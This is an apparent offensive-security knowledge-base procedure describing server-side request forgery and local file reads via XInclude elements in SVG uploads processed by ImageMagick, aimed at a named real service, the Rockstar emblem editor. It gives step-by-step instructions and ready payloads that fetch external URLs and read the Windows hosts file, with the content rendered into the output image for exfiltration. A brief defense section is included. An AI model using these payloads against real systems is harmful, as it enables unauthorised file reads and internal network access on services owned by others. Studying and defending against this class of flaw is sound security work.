---
id: proc-uuid-003
name: SSRF-and-LFI-via-XInclude-in-SVG
tags:
  - xinclude
  - ssrf
  - lfi
type: procedure
tools:
  - '[[tools/ImageMagick]]'
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[File and Directory Discovery]]'
  - '[[Exploitation of Remote Services]]'
updated_at: '2025-12-14T03:46:14.429Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[File and Directory Discovery]]'
  - '[[Exploitation of Remote Services]]'
---
# SSRF-and-LFI-via-XInclude-in-SVG

## Summary

This procedure uses XInclude directives in SVG inputs to ImageMagick for reliable SSRF and LFI, fetching external URLs or local files and including their content in the rendered output, bypassing potential XXE restrictions in the Rockstar emblem editor.

## Description

ImageMagick supports XInclude for XML processing in SVGs, allowing inclusion of external resources via <xi:include> without needing DOCTYPE entities. This enables SSRF by fetching HTTP content and LFI by referencing file:// paths, with data rendered directly in the PNG emblem. It's more reliable than XXE in some configurations and targets the same Windows-based web editor.

## Requirements

1. Access to submit SVG inputs in the emblem editor
2. Vulnerable ImageMagick with XInclude enabled (default in older versions)
3. No external hosting needed for basic LFI, but server for SSRF verification

## Defense

Defensive measures and detection strategies:

- Disable XInclude in ImageMagick by recompiling without libxml2 support or using sandboxing
- Parse and validate SVGs to strip xi:include elements before processing
- Network firewall rules to block outbound requests from ImageMagick

## Objectives

1. Fetch arbitrary external HTTP content via SSRF
2. Include local file contents via LFI
3. Render included data for exfiltration

## Instructions

### Step 1: Craft XInclude for SSRF

**Context**: Embed XInclude to fetch an external URL.

In SVG text element:

```xml
<text x="10" y="10"> <xi:include href="https://www.google.com/" parse="text"/> </text>
```

> ImageMagick fetches and inserts the response text.

### Step 2: Adapt for LFI

**Context**: Switch to file protocol for local reads.

Use:

```xml
<text x="10" y="10"> <xi:include href="file:///C:/Windows/system32/drivers/etc/hosts" parse="text"/> </text>
```

> Renders the file contents in the emblem.

### Step 3: Submit and Capture

**Context**: Process the SVG to trigger inclusion.

Submit to editor and generate PNG.

> Verify data in the rendered image.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]
- [[Collection]]

### Techniques

- [[File and Directory Discovery]]
- [[Exploitation of Remote Services]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/ImageMagick]]

## Tags

- [[xinclude]]
- [[ssrf]]
- [[lfi]]
